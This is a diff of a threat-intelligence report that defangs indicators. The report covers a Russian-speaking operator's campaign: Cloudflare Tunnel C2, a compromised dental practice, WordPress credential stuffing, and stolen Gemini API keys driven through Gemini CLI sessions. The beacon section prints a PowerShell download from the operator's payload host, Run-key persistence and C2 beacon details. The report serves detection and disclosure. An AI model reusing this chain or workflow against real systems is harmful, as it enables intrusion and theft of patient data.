-**The operator's publicly-published GitHub repository:** `github.com/oravepo546-stack/Gemini-CLI-api-key-rotation` is a round-robin Gemini API key rotation wrapper. The repository is under the operator's secondary GitHub identity (`oravepo546-stack` organization account, distinct from the primary `sonner1337` user account). The captured GitHub PAT (defanged: `ghp_tdcX...DaRW`) is associated with this organization account. This is direct operator-side OPSEC failure, the operator's *technique* for rotating stolen API keys is publicly published under an operator-controlled identity that links back to operational artifacts on the operator workstation.
+**The operator's publicly-published GitHub repository:** `github[.]com/oravepo546-stack/Gemini-CLI-api-key-rotation` is a round-robin Gemini API key rotation wrapper. The repository is under the operator's secondary GitHub identity (`oravepo546-stack` organization account, distinct from the primary `sonner1337` user account). The captured GitHub PAT (defanged: `ghp_tdcX...DaRW`) is associated with this organization account. This is direct operator-side OPSEC failure, the operator's *technique* for rotating stolen API keys is publicly published under an operator-controlled identity that links back to operational artifacts on the operator workstation.
 
 This matters because frontier-LLM API keys represent shifted compute cost, with the legitimate key holder's billing account charged for the operator's attacks. 40+ keys at modest per-day usage adds up to a significant cumulative AI-compute resource. The validation and rotation pipeline is the engineering effort that makes the stolen-key model sustainable at operational tempo.
 
@@ -381,28 +381,28 @@ To detect it, a Sigma rule watches outbound HTTPS to `generativelanguage.googlea
 
 ### 4.5 Cloudflare Tunnel Topology + Persistent Victim Access
 
-> **Analyst note:** This subsection documents the operator's use of Cloudflare Tunnel under an operator-owned custom domain (`tralalarkefe.com`) to provide persistent, TLS-encrypted, IP-block-resistant access into the healthcare victim environment. Six tunnel subdomains are configured. Two of the six provide direct operator-side inbound access into victim hosts: `windows_server.tralalarkefe.com` for RDP/WinRM into the Windows server, and `gil_dr1.tralalarkefe.com` for SSH. This is a meaningful evolution beyond documented `trycloudflare.com` quick-tunnel abuse. The custom-domain tunnel survives quick-tunnel teardown and enables post-migration agent reconnection.
+> **Analyst note:** This subsection documents the operator's use of Cloudflare Tunnel under an operator-owned custom domain (`tralalarkefe[.]com`) to provide persistent, TLS-encrypted, IP-block-resistant access into the healthcare victim environment. Six tunnel subdomains are configured. Two of the six provide direct operator-side inbound access into victim hosts: `windows_server.tralalarkefe[.]com` for RDP/WinRM into the Windows server, and `gil_dr1.tralalarkefe[.]com` for SSH. This is a meaningful evolution beyond documented `trycloudflare[.]com` quick-tunnel abuse. The custom-domain tunnel survives quick-tunnel teardown and enables post-migration agent reconnection.
 
 I hold this DEFINITE, with the Cloudflare API token captured and the full tunnel inventory pulled from the operator's filesystem.
 
-**Tunnel inventory (six subdomains under `tralalarkefe.com`):**
+**Tunnel inventory (six subdomains under `tralalarkefe[.]com`):**
 
 | Subdomain | Role | Protocol | Persistence Implication |
 |---|---|---|---|
-| `c2.tralalarkefe.com` | Custom C2 API endpoint family | HTTPS | Operator-side; agents beacon to this |
-| `payloads.tralalarkefe.com` | PowerShell payload distribution | HTTPS | Operator-side; agents fetch `.ps1` from this |
-| `windows_server.tralalarkefe.com` | RDP/WinRM into the victim Windows host | TCP (RDP) / HTTPS (WinRM) | Victim-side persistent operator access |
-| `gil_dr1.tralalarkefe.com` | SSH into the victim Linux/management host | TCP (SSH) | Victim-side persistent operator access |
-| `catchall1.tralalarkefe.com` | Catch-all tunnel | HTTPS | Unknown role |
-| `10101.tralalarkefe.com` | Numbered tunnel (port-numbered) | HTTPS | Unknown role; possibly C2 instance on port 10101 |
+| `c2[.]tralalarkefe[.]com` | Custom C2 API endpoint family | HTTPS | Operator-side; agents beacon to this |
+| `payloads[.]tralalarkefe[.]com` | PowerShell payload distribution | HTTPS | Operator-side; agents fetch `.ps1` from this |
+| `windows_server.tralalarkefe[.]com` | RDP/WinRM into the victim Windows host | TCP (RDP) / HTTPS (WinRM) | Victim-side persistent operator access |
+| `gil_dr1.tralalarkefe[.]com` | SSH into the victim Linux/management host | TCP (SSH) | Victim-side persistent operator access |
+| `catchall1[.]tralalarkefe[.]com` | Catch-all tunnel | HTTPS | Unknown role |
+| `10101[.]tralalarkefe[.]com` | Numbered tunnel (port-numbered) | HTTPS | Unknown role; possibly C2 instance on port 10101 |
 
-There is also one ephemeral bootstrap tunnel. `tenant-upcoming-great-descending.trycloudflare.com` is a `trycloudflare.com` ephemeral quick-tunnel used for one-time bootstrap payload bundle delivery. Quick-tunnels cannot be pre-blocked at the domain level, because any defender block of `*.trycloudflare.com` is overbroad, which makes them ideal for one-time delivery. The operator pairs the ephemeral quick-tunnel with the stable custom-domain tunnel for subsequent persistent access.
+There is also one ephemeral bootstrap tunnel. `tenant-upcoming-great-descending[.]trycloudflare[.]com` is a `trycloudflare[.]com` ephemeral quick-tunnel used for one-time bootstrap payload bundle delivery. Quick-tunnels cannot be pre-blocked at the domain level, because any defender block of `*.trycloudflare[.]com` is overbroad, which makes them ideal for one-time delivery. The operator pairs the ephemeral quick-tunnel with the stable custom-domain tunnel for subsequent persistent access.
 
-**Why this is more persistent than documented `trycloudflare.com` abuse:** The Proofpoint 2024-08-01 RAT-via-Cloudflare-Tunnel coverage documented the `trycloudflare.com` quick-tunnel pattern. Quick-tunnels are ephemeral by design, they expire when the operator-side `cloudflared` process terminates, and the random subdomain is not reused. Custom-domain tunnels under an operator-owned domain are stable. The tunnel UUID and subdomain remain bound to the operator's Cloudflare account, and a new `cloudflared` process can reconnect to the same tunnel UUID after migration. This enables post-migration agent reconnection: if the operator's source IP changes, the agent still beacons to `c2.tralalarkefe.com` successfully.
+**Why this is more persistent than documented `trycloudflare[.]com` abuse:** The Proofpoint 2024-08-01 RAT-via-Cloudflare-Tunnel coverage documented the `trycloudflare[.]com` quick-tunnel pattern. Quick-tunnels are ephemeral by design, they expire when the operator-side `cloudflared` process terminates, and the random subdomain is not reused. Custom-domain tunnels under an operator-owned domain are stable. The tunnel UUID and subdomain remain bound to the operator's Cloudflare account, and a new `cloudflared` process can reconnect to the same tunnel UUID after migration. This enables post-migration agent reconnection: if the operator's source IP changes, the agent still beacons to `c2[.]tralalarkefe[.]com` successfully.
 
 The captured Cloudflare full-admin API token is the lever. The operator's token (defanged to `pBkvccy9...TBztGF2`) gives Cloudflare PSIRT a single subpoena-grade way to tear down the entire C2 transport layer, all six tunnel subdomains plus the operator-controlled zone (`6d415863...18f47af5`). This is the **single most actionable disclosure target in the campaign**, and Cloudflare PSIRT engagement is the recommended Tier-0 disclosure action.
 
-To detect it, one Sigma rule watches outbound HTTPS to the `*.tralalarkefe.com` SNI, and another watches `cloudflared access tcp --hostname *.tralalarkefe.com` argv on internal Linux hosts. The second catches operator-side use; for victim-side detection, look instead for any `cloudflared` process running with non-organization-account credentials. Detection rules are in Section 10.
+To detect it, one Sigma rule watches outbound HTTPS to the `*.tralalarkefe[.]com` SNI, and another watches `cloudflared access tcp --hostname *.tralalarkefe[.]com` argv on internal Linux hosts. The second catches operator-side use; for victim-side detection, look instead for any `cloudflared` process running with non-organization-account credentials. Detection rules are in Section 10.
 
 ### 4.6 Healthcare Victim Compromise (HIPAA-Regulated Active Breach)
 
@@ -421,7 +421,7 @@ The specific practice name is not published in this report body; The Hunters Led
 **Victim environment inventory (from operator-side artifacts):**
 
 - **Active Directory domain:** `[victim AD domain, redacted]`
-- **Primary server internal IP:** `[victim internal host, redacted]` (Windows server, RDP/WinRM access via `windows_server.tralalarkefe.com`)
+- **Primary server internal IP:** `[victim internal host, redacted]` (Windows server, RDP/WinRM access via `windows_server.tralalarkefe[.]com`)
 - **Secondary host internal IP:** `[victim internal host, redacted]` (designated `FRONT2` in operator notes)
 - **Subnets compromised:** two internal subnets
 - **Local NTLM hashes captured (6 accounts):**
@@ -433,8 +433,8 @@ The specific practice name is not published in this report body; The Hunters Led
   - `9117918d...dd04`: local SAM account
 - **OpenDental MySQL root password hash:** captured (MySQL native password hash format), provides direct access to OpenDental patient database
 - **Persistent operator access at capture:**
-  - `windows_server.tralalarkefe.com` (RDP/WinRM)
-  - `gil_dr1.tralalarkefe.com` (SSH)
+  - `windows_server.tralalarkefe[.]com` (RDP/WinRM)
+  - `gil_dr1.tralalarkefe[.]com` (SSH)
 
 On HIPAA risk, OpenDental stores Patient Health Information (PHI) including patient demographics, clinical notes, treatment plans, payment information and insurance information. Operator-controlled root access to the OpenDental MySQL database provides full PHI read capability. Whether PHI has already been exfiltrated requires victim-side forensic analysis, an egress data volume review against the operator-access time window, but the *capability* is configured and operational at capture time.
 
@@ -451,19 +451,19 @@ The HIPAA Breach Notification Rule sets specific timelines and notification requ
 
 I hold this DEFINITE, with all three platforms captured alongside operator-side metadata.
 
-The first platform is AEZA AS210644 at `213.165.51.115`, hosting the operator workstation. AEZA Group LLC is a Russian-corporate provider under OFAC sanctions effective 2025-07-01 (Federal Register citation 2025-20573, effective 2025-11-21). Its known customer base includes BianLian ransomware, RedLine infostealer, Meduza infostealer, Lumma infostealer, the BlackSprut darknet marketplace, Doppelganger disinformation, plus this operator (<a href="/actors/UTA-2026-012/">UTA-2026-012</a>) and the Case 9 GHOST cryptojacker operators (Sub-report 1). AEZA's non-cooperative abuse response posture combined with its OFAC sanction status places the provider in the bulletproof-adjacent class. The operator's open-directory exposure on `213.165.51.115` was self-cleaned between the Phase 7 and Phase 8 captures, reaching totalItems: 0 by 2026-05-23, so the operator detected and responded to the exposure within days.
+The first platform is AEZA AS210644 at `213[.]165[.]51[.]115`, hosting the operator workstation. AEZA Group LLC is a Russian-corporate provider under OFAC sanctions effective 2025-07-01 (Federal Register citation 2025-20573, effective 2025-11-21). Its known customer base includes BianLian ransomware, RedLine infostealer, Meduza infostealer, Lumma infostealer, the BlackSprut darknet marketplace, Doppelganger disinformation, plus this operator (<a href="/actors/UTA-2026-012/">UTA-2026-012</a>) and the Case 9 GHOST cryptojacker operators (Sub-report 1). AEZA's non-cooperative abuse response posture combined with its OFAC sanction status places the provider in the bulletproof-adjacent class. The operator's open-directory exposure on `213[.]165[.]51[.]115` was self-cleaned between the Phase 7 and Phase 8 captures, reaching totalItems: 0 by 2026-05-23, so the operator detected and responded to the exposure within days.
 
 **Platform 2, Google Cloud Platform (three instances + two projects):**
 
 - **Project `[victim-named GCP project, redacted]`**: operator-named-after-victim. Operator-controlled. The project name is the single largest OPSEC failure in the campaign, it ties the operator's GCP account directly to the specific victim.
-- **Project `elated-gizmo-491112-k0`**: operator's existing GCP project. The service account `geminicli@elated-gizmo-491112-k0.iam.gserviceaccount.com` is billing-account-associated and is the law enforcement attribution path via Google Cloud Trust & Safety.
-- **Instance `34.34.57.141` (NL, Ghost Proxy)**: Operator proxy. All GCP logging on this instance is explicitly disabled, deliberate OPSEC investment on a cloud instance, demonstrating operator awareness of cloud-provider telemetry as a defender resource.
-- **Instance `35.192.41.201` (US, Mailpit)**: Mail test instance.
-- **Instance `34.34.81.129` (NL, Windows C2)**: Windows-side C2 instance.
+- **Project `elated-gizmo-491112-k0`**: operator's existing GCP project. The service account `geminicli[@]elated-gizmo-491112-k0[.]iam[.]gserviceaccount[.]com` is billing-account-associated and is the law enforcement attribution path via Google Cloud Trust & Safety.
+- **Instance `34[.]34[.]57[.]141` (NL, Ghost Proxy)**: Operator proxy. All GCP logging on this instance is explicitly disabled, deliberate OPSEC investment on a cloud instance, demonstrating operator awareness of cloud-provider telemetry as a defender resource.
+- **Instance `35[.]192[.]41[.]201` (US, Mailpit)**: Mail test instance.
+- **Instance `34[.]34[.]81[.]129` (NL, Windows C2)**: Windows-side C2 instance.
 
-**Platform 3, Cloudflare (custom domain `tralalarkefe.com` + 6 tunnel subdomains + zone `6d415863...18f47af5` + full-admin API token):** Detailed in subsection 4.5. The operator-controlled API token provides Cloudflare PSIRT a single subpoena-grade lever.
+**Platform 3, Cloudflare (custom domain `tralalarkefe[.]com` + 6 tunnel subdomains + zone `6d415863...18f47af5` + full-admin API token):** Detailed in subsection 4.5. The operator-controlled API token provides Cloudflare PSIRT a single subpoena-grade lever.
 
-For defenders, the sovereignty-diversified stack means victim-side telemetry shows only Cloudflare and GCP traffic, and the AEZA hosting is invisible from that vantage. An egress block on Cloudflare or GCP IP ranges is overbroad, since both are legitimate edge and cloud providers used by many legitimate organizations. The defensible blocks are (a) an SNI block on `*.tralalarkefe.com`, (b) a DNS block on `tralalarkefe.com` and any captured tunnel subdomain, and (c) an IP block on the specific GCP instances captured (`34.34.81.129`, `34.34.57.141`, `35.192.41.201`).
+For defenders, the sovereignty-diversified stack means victim-side telemetry shows only Cloudflare and GCP traffic, and the AEZA hosting is invisible from that vantage. An egress block on Cloudflare or GCP IP ranges is overbroad, since both are legitimate edge and cloud providers used by many legitimate organizations. The defensible blocks are (a) an SNI block on `*.tralalarkefe[.]com`, (b) a DNS block on `tralalarkefe[.]com` and any captured tunnel subdomain, and (c) an IP block on the specific GCP instances captured (`34[.]34[.]81[.]129`, `34[.]34[.]57[.]141`, `35[.]192[.]41[.]201`).
 
 ### 4.8 Co-located Telegram Disinformation Operation (`@americanpatriotus` / Quantum Patriot)
 
@@ -481,19 +481,19 @@ This is rare in published reporting. DFRLab's catalog of Russian-operated Kremli
 
 For cross-domain coordination I would recommend DFRLab for channel content analysis, Stanford Internet Observatory for cross-domain operator class research, and OpenMinds for ecosystem positioning of `@americanpatriotus` within the documented 52-channel conduit networks.
 
-### 4.9 Commodity Service Procurement Layer (AntiPublic.one + nuclei + Stealer Logs)
+### 4.9 Commodity Service Procurement Layer (AntiPublic[.]one + nuclei + Stealer Logs)
 
-> **Analyst note:** This subsection documents the commodity-tier services the operator integrates into the custom credential mill: AntiPublic.one (commercial paid breach-data API, 6.56B records per service description, JWT-authenticated), nuclei (ProjectDiscovery legitimate open-source vulnerability scanner with operator-bespoke `wp_admin_hunter.yaml` template), and downstream stealer-logs from infostealer markets. The hybrid resource model (custom-built C2 + commodity paid services + commodity stolen LLM keys) is a HIGH-confidence dimension of the operator profile (Section 9).
+> **Analyst note:** This subsection documents the commodity-tier services the operator integrates into the custom credential mill: AntiPublic[.]one (commercial paid breach-data API, 6.56B records per service description, JWT-authenticated), nuclei (ProjectDiscovery legitimate open-source vulnerability scanner with operator-bespoke `wp_admin_hunter.yaml` template), and downstream stealer-logs from infostealer markets. The hybrid resource model (custom-built C2 + commodity paid services + commodity stolen LLM keys) is a HIGH-confidence dimension of the operator profile (Section 9).
 
 I hold this DEFINITE, with the JWT captured, the nuclei tool and its custom template captured, and the stealer-log integration captured in the scripts.
 
-**Commodity service 1, AntiPublic.one paid subscription:**
+**Commodity service 1, AntiPublic[.]one paid subscription:**
 
 - **JWT identifiers captured:** `jti:44298`, `sub:31703`
 - **191 MB AntiPublic tool directory** captured in operator filesystem
-- **Integration:** `mass_wp_mutator.py` calls `https://antipublic.one/api/v2/search` to enrich captured email targets with prior breach data, the prior breach data feeds the `ai_sniper_brute.py` LLM mutator's `Most Recent Password from dump:` field
-- **Service tier:** AntiPublic.one operates a paid-subscription commercial tier accessible to operator-class customers (per Trend Micro coverage)
-- **Russian-cybercrime ecosystem affiliation:** AntiPublic.one is Russian-language-primary; paid subscriptions are an established commercial-tier signal in the ecosystem
+- **Integration:** `mass_wp_mutator.py` calls `hxxps://antipublic[.]one/api/v2/search` to enrich captured email targets with prior breach data, the prior breach data feeds the `ai_sniper_brute.py` LLM mutator's `Most Recent Password from dump:` field
+- **Service tier:** AntiPublic[.]one operates a paid-subscription commercial tier accessible to operator-class customers (per Trend Micro coverage)
+- **Russian-cybercrime ecosystem affiliation:** AntiPublic[.]one is Russian-language-primary; paid subscriptions are an established commercial-tier signal in the ecosystem
 
 **Commodity service 2, nuclei (ProjectDiscovery):**
 
@@ -611,7 +611,7 @@ These are Markdown files captured from the operator's open directory. I hold the
 ```
 
 **`C2_INFRA_TRANSFER.md` content (paraphrased, full text in offline evidence):**
-- Documents the current Cloudflare Tunnel topology under `tralalarkefe.com`
+- Documents the current Cloudflare Tunnel topology under `tralalarkefe[.]com`
 - Lists the four GCP instances (Ghost Proxy, Mailpit, Windows C2) with roles
 - References the operator's GCP service account
 - Forward-looking notes on planned infrastructure changes
@@ -631,7 +631,7 @@ These are Markdown files captured from the operator's open directory. I hold the
 - `**From:** Gemini CLI`
 - `When starting a new session, refer to this file` (session-start load directive)
 - `Братух` (Russian-native operator persona-string addressed to Gemini)
-- Co-occurrence with C2 endpoint URL patterns (`/api/v1/update`, `c2.tralalarkefe.com`) or credential-table indicators
+- Co-occurrence with C2 endpoint URL patterns (`/api/v1/update`, `c2[.]tralalarkefe[.]com`) or credential-table indicators
 
 These strings combine into Rule 2 in the linked detection file (Section 10).
 
@@ -645,9 +645,9 @@ This is PowerShell, referenced in the operator's handoff documents, though the f
 
 The PowerShell beacon `agent_final.ps1` is referenced in `DEPLOYED_TOOLS.md` as the victim-side agent component. The full source code was not extracted in the captured open-directory snapshot. Inferred behavior from operator-side notes and observed network traffic:
 
-- Initial download via `Invoke-RestMethod -Uri https://payloads.tralalarkefe.com/run_bg.ps1` after `[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12`
+- Initial download via `Invoke-RestMethod -Uri hxxps://payloads[.]tralalarkefe[.]com/run_bg.ps1` after `[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12`
 - Persistence via HKCU Run key `WindowsUpdateManager` pointing to `%LOCALAPPDATA%\Microsoft\WindowsUpdateManager.ps1`
-- Beacon every 5 seconds to `https://c2.tralalarkefe.com/api/v1/update` with `X-Agent-ID: HOSTNAME_user` header and base64(UTF-16LE) body
+- Beacon every 5 seconds to `hxxps://c2[.]tralalarkefe[.]com/api/v1/update` with `X-Agent-ID: HOSTNAME_user` header and base64(UTF-16LE) body
 - Inferred Quasar-class lineage from operator handoff notes referencing "Quasar fork"; not independently confirmed
 
 The MODERATE confidence floor on this component reflects that the binary was not directly extracted. Detection signatures in Section 10 cover the observable network behavior (which is DEFINITE per direct capture).
@@ -676,7 +676,7 @@ These strings do not Google-Translate cleanly. The idiom register is consistent 
 {: .hl-tier-3}
 {: .hl-tab-chain}
 
-> **Analyst note:** This section covers the operator's runtime behavior captured across 122 Gemini CLI session JSONs (Phase 11 analysis), open-directory observation of `213.165.51.115` (Hunt.io platform first-seen 2026-03-30; cleaned by 2026-05-23), and network behavior inferred from the captured operator tooling and victim-side artifacts. The operator's behavioral patterns are: (1) Gemini CLI session-driven workflows with handoff documents between sessions, (2) multi-hour mass-WP-validation runs against ~30,000 sites, (3) live posting to `@americanpatriotus` Telegram channel via Gemini-drafted content, (4) cloudflared tunnel registration and victim-side persistent access establishment, and (5) detection-aware open-directory cleanup within days of exposure.
+> **Analyst note:** This section covers the operator's runtime behavior captured across 122 Gemini CLI session JSONs (Phase 11 analysis), open-directory observation of `213[.]165[.]51[.]115` (Hunt.io platform first-seen 2026-03-30; cleaned by 2026-05-23), and network behavior inferred from the captured operator tooling and victim-side artifacts. The operator's behavioral patterns are: (1) Gemini CLI session-driven workflows with handoff documents between sessions, (2) multi-hour mass-WP-validation runs against ~30,000 sites, (3) live posting to `@americanpatriotus` Telegram channel via Gemini-drafted content, (4) cloudflared tunnel registration and victim-side persistent access establishment, and (5) detection-aware open-directory cleanup within days of exposure.
 
 <details markdown="1" class="hl-teardown">
 <summary>The session workflow pattern, the mass validation run, the disinformation posting workflow, the tunnel registration and the cleanup, in full. Click to expand.</summary>
@@ -703,11 +703,11 @@ Network behavior pattern of a mass-WP-validation run:
 
 1. **Initial enumeration**: `nuclei` invoked with operator-bespoke `wp_admin_hunter.yaml` template against a list of ~30,000 WordPress sites
 2. **Per-site reachability test**: HTTP GET against `/wp-login.php` per site; 200 OK indicates reachable admin login page
-3. **Per-site credential test**: for reachable sites, POST credential candidates from the AntiPublic.one + LLM-mutator pipeline against `/wp-admin/admin-ajax.php` and `/wp-login.php`
+3. **Per-site credential test**: for reachable sites, POST credential candidates from the AntiPublic[.]one + LLM-mutator pipeline against `/wp-admin/admin-ajax.php` and `/wp-login.php`
 4. **Success capture**: successful credential pairs written to `AI_SNIPER_GOODS.txt` (or sibling output files)
 5. **Multi-hour runtime**: the 38.7 MB log size suggests multi-hour runtime; tempo throttled per operator's Russian comment on 3-thread concurrency
 
-The mass-WP-validation run egresses from operator-side infrastructure, either the AEZA workstation or the GCP proxy `34.34.57.141`, and the captured log does not unambiguously identify which. Per-target rate is throttled to roughly 3 concurrent requests, per the operator's own source comments.
+The mass-WP-validation run egresses from operator-side infrastructure, either the AEZA workstation or the GCP proxy `34[.]34[.]57[.]141`, and the captured log does not unambiguously identify which. Per-target rate is throttled to roughly 3 concurrent requests, per the operator's own source comments.
 
 ### 6.3 Live Disinformation Posting Workflow (Session 2026-03-25T18-27)
 
@@ -728,8 +728,8 @@ I hold this DEFINITE, with the tunnel inventory and the Cloudflare API token bot
 
 Behavioral sequence for establishing victim-side persistent access via Cloudflare Tunnel:
 
-1. **Operator runs `cloudflared tunnel create`** under the operator-controlled Cloudflare account (operator-owned zone `6d415863...18f47af5` on `tralalarkefe.com`)
-2. **Operator binds a tunnel subdomain** (e.g., `windows_server.tralalarkefe.com`) to a tunnel UUID
+1. **Operator runs `cloudflared tunnel create`** under the operator-controlled Cloudflare account (operator-owned zone `6d415863...18f47af5` on `tralalarkefe[.]com`)
+2. **Operator binds a tunnel subdomain** (e.g., `windows_server.tralalarkefe[.]com`) to a tunnel UUID
 3. **Operator deploys `cloudflared` on the victim host** (or instructs the victim host to deploy `cloudflared` via the PowerShell beacon's command execution channel)
 4. **Victim-side `cloudflared` registers with the operator's Cloudflare account** and establishes outbound HTTPS connection to Cloudflare edge
 5. **Operator accesses the tunnel subdomain** from operator-side; Cloudflare routes the operator's connection through the tunnel to the victim host
@@ -744,19 +744,19 @@ The defender-visible indicators on the victim side:
 
 I hold this DEFINITE, on Hunt.io platform snapshots before and after, showing totalItems: 0 by 2026-05-23.
 
-The operator detected the public exposure and wiped the open directory within days, but kept the live infrastructure running. Hunt.io first observed the `213.165.51.115` open directory on 2026-03-30, and The Hunters Ledger deep-pulled the arsenal across multiple investigation phases through 2026-05-23. Between Phase 7 and Phase 8 capture the directory was cleaned (totalItems: 0 by 2026-05-23), plausibly after the operator noticed Hunt.io indexing or the Trend Micro publication ramp-up. The cleanup is detection-and-response behavior, not abandonment: the Cloudflare Tunnel and GCP overlay stayed operational.
+The operator detected the public exposure and wiped the open directory within days, but kept the live infrastructure running. Hunt.io first observed the `213[.]165[.]51[.]115` open directory on 2026-03-30, and The Hunters Ledger deep-pulled the arsenal across multiple investigation phases through 2026-05-23. Between Phase 7 and Phase 8 capture the directory was cleaned (totalItems: 0 by 2026-05-23), plausibly after the operator noticed Hunt.io indexing or the Trend Micro publication ramp-up. The cleanup is detection-and-response behavior, not abandonment: the Cloudflare Tunnel and GCP overlay stayed operational.
 
 ### 6.6 Network Behavior Summary Table
 
 | Behavior | Source | Destination | Protocol | Indicator |
 |---|---|---|---|---|
-| Beacon (victim → C2) | Victim host with PowerShell beacon | `c2.tralalarkefe.com` | HTTPS | `POST /api/v1/update`, `X-Agent-ID: HOSTNAME_user`, 5-second interval, base64(UTF-16LE) body |
-| Payload fetch (victim → operator) | Victim host (PowerShell) | `payloads.tralalarkefe.com` | HTTPS | `GET /run_bg.ps1` after `SecurityProtocol = Tls12` |
-| RDP/WinRM (operator → victim) | Operator | `windows_server.tralalarkefe.com` | TCP (RDP) / HTTPS (WinRM) | Inbound tunnel from operator |
-| SSH (operator → victim) | Operator | `gil_dr1.tralalarkefe.com` | TCP (SSH over tunnel) | Inbound tunnel from operator |
+| Beacon (victim → C2) | Victim host with PowerShell beacon | `c2[.]tralalarkefe[.]com` | HTTPS | `POST /api/v1/update`, `X-Agent-ID: HOSTNAME_user`, 5-second interval, base64(UTF-16LE) body |
+| Payload fetch (victim → operator) | Victim host (PowerShell) | `payloads[.]tralalarkefe[.]com` | HTTPS | `GET /run_bg.ps1` after `SecurityProtocol = Tls12` |
+| RDP/WinRM (operator → victim) | Operator | `windows_server.tralalarkefe[.]com` | TCP (RDP) / HTTPS (WinRM) | Inbound tunnel from operator |
+| SSH (operator → victim) | Operator | `gil_dr1.tralalarkefe[.]com` | TCP (SSH over tunnel) | Inbound tunnel from operator |
 | Gemini API (operator → Google) | Operator-side (AEZA or GCP proxy) | `generativelanguage.googleapis.com` | HTTPS | High key-diversity (`?key=AIzaSy*`); 40+ keys cycled |
-| AntiPublic search (operator → service) | Operator-side | `antipublic.one/api/v2/search` | HTTPS | JWT-authenticated (operator JWT `sub:31703`) |
-| Ephemeral bootstrap (one-time) | Operator-side | `tenant-upcoming-great-descending.trycloudflare.com` | HTTPS | `.tar.gz` payload bundle delivery |
+| AntiPublic search (operator → service) | Operator-side | `antipublic[.]one/api/v2/search` | HTTPS | JWT-authenticated (operator JWT `sub:31703`) |
+| Ephemeral bootstrap (one-time) | Operator-side | `tenant-upcoming-great-descending[.]trycloudflare[.]com` | HTTPS | `.tar.gz` payload bundle delivery |
 
 </details>
 
@@ -778,7 +778,7 @@ The full ATT&CK technique mapping for this case is maintained alongside the dete
 
 > **Analyst note:** The complete IOC set for this case is published as a machine-readable JSON feed for direct SIEM/EDR ingestion. It is not duplicated inline here. The highest-priority indicators are also surfaced in the IOC panel (fingerprint icon) on this page.
 
-The full IOC feed is at [`/ioc-feeds/russian-gemini-credential-mill-213.165.51.115-iocs.json`](https://the-hunters-ledger.com/ioc-feeds/russian-gemini-credential-mill-213.165.51.115-iocs.json), carrying every indicator for this case with type, confidence and recommended action.
+The full IOC feed is at [`/ioc-feeds/russian-gemini-credential-mill-213[.]165[.]51[.]115-iocs.json`](https://the-hunters-ledger.com/ioc-feeds/russian-gemini-credential-mill-213.165.51.115-iocs.json), carrying every indicator for this case with type, confidence and recommended action.
 
 ---
 
@@ -807,7 +807,7 @@ Named-actor attribution stays **INSUFFICIENT (<50%)**, because `bandcampro` is a
 
 **The 5-point IOC cross-match (DEFINITE):**
 
-1. **IP match (4-of-4 exact):** `213.165.51.115`, `34.34.57.141`, `34.34.81.129`, `35.192.41.201`. All four operator IPs match exactly between The Hunters Ledger's open-directory capture (Hunt.io first-seen 2026-03-30) and Trend Micro's publication.
+1. **IP match (4-of-4 exact):** `213[.]165[.]51[.]115`, `34[.]34[.]57[.]141`, `34[.]34[.]81[.]129`, `35[.]192[.]41[.]201`. All four operator IPs match exactly between The Hunters Ledger's open-directory capture (Hunt.io first-seen 2026-03-30) and Trend Micro's publication.
 2. **Telegram channel match:** `@americanpatriotus` documented by both vendors.
 3. **Stolen Gemini API key inventory:** Trend Micro reports 73 stolen keys; The Hunters Ledger captured 40+ in the open-directory snapshot (counts differ because the open-directory exposure is a partial snapshot; both vendors agree on the bulk-stolen-keys pattern).
 4. **20-mutation-per-target generation pattern:** Trend Micro documents the operational pattern; The Hunters Ledger captures the source code with verbatim prompt.
@@ -823,17 +823,17 @@ Synthesizing the 122-session Gemini CLI corpus (the investigation's Phase 11 dee
 
 The first axis is Russian-native, and I hold it DEFINITE. The evidence is an informal idiom register (`Бро`, `братух`, `Погнали`, `тачка`, `Комп Доктора`), Cyrillic-English technical bilingualism in source code comments, an in-session credential ledger format header `Формат: Имя тачки - Юзер - Пароль` re-pasted across 4+ Gemini CLI sessions, and Trend Micro's independent characterization as Russian-speaking. The strings do not Google-Translate cleanly, and the register is consistent with a native Russian speaker.
 
-The second axis is mid-tier selective sophistication, and I hold it HIGH. The sophisticated dimensions are the Cloudflare custom-domain Tunnel topology, the GCP multi-instance overlay, the AEZA bulletproof workstation, the AI workflow integration, and persistent victim access via Cloudflare Tunnel. The rough OPSEC dimensions are a victim-named GCP project `[victim-named GCP project, redacted]`, a full Cloudflare API token in plaintext, a GitHub PAT in plaintext, an AntiPublic.one JWT in plaintext, 40+ stolen Gemini keys left unencrypted, and open-directory exposure on port 8082. The incomplete implementation shows in the `/api/v1/get_results` endpoint called by client but never server-implemented, direct evidence of in-place iterative development against a live victim, plus documentation drift across infrastructure notes and a zero-auth, path-traversal-vulnerable C2 backend.
+The second axis is mid-tier selective sophistication, and I hold it HIGH. The sophisticated dimensions are the Cloudflare custom-domain Tunnel topology, the GCP multi-instance overlay, the AEZA bulletproof workstation, the AI workflow integration, and persistent victim access via Cloudflare Tunnel. The rough OPSEC dimensions are a victim-named GCP project `[victim-named GCP project, redacted]`, a full Cloudflare API token in plaintext, a GitHub PAT in plaintext, an AntiPublic[.]one JWT in plaintext, 40+ stolen Gemini keys left unencrypted, and open-directory exposure on port 8082. The incomplete implementation shows in the `/api/v1/get_results` endpoint called by client but never server-implemented, direct evidence of in-place iterative development against a live victim, plus documentation drift across infrastructure notes and a zero-auth, path-traversal-vulnerable C2 backend.
 
 The third axis is an active campaign with concurrent R&D, and I hold it HIGH. `min1.sh` and other operator-built tooling were Last Modified during the investigation window, 122 Gemini CLI session JSONs span multiple operational threads and concurrent development, the operator iterated on C2 source while deployed against the healthcare victim, and the open directory was cleaned to totalItems: 0 by 2026-05-23 within days of exposure, detection-and-response behavior consistent with continued operator activity.
 
-The fourth axis is the hybrid resource model, and I hold it HIGH. Custom-built are `c2_server.py`, Python stdlib BaseHTTPServer only with no FastAPI, Flask or aiohttp dependency, and the operator-authored `ai_sniper_brute.py`. Commodity paid are the 38.7 MB `nuclei` mega-hunt log and the AntiPublic.one paid subscription (JWT `sub:31703`). Commodity stolen are the 40+ Gemini API keys with MD5 hash tracking, the OpenAI key, and the Venice AI key.
+The fourth axis is the hybrid resource model, and I hold it HIGH. Custom-built are `c2_server.py`, Python stdlib BaseHTTPServer only with no FastAPI, Flask or aiohttp dependency, and the operator-authored `ai_sniper_brute.py`. Commodity paid are the 38.7 MB `nuclei` mega-hunt log and the AntiPublic[.]one paid subscription (JWT `sub:31703`). Commodity stolen are the 40+ Gemini API keys with MD5 hash tracking, the OpenAI key, and the Venice AI key.
 
 ### 9.4 Cross-Domain Finding (Rare in Published Reporting)
 
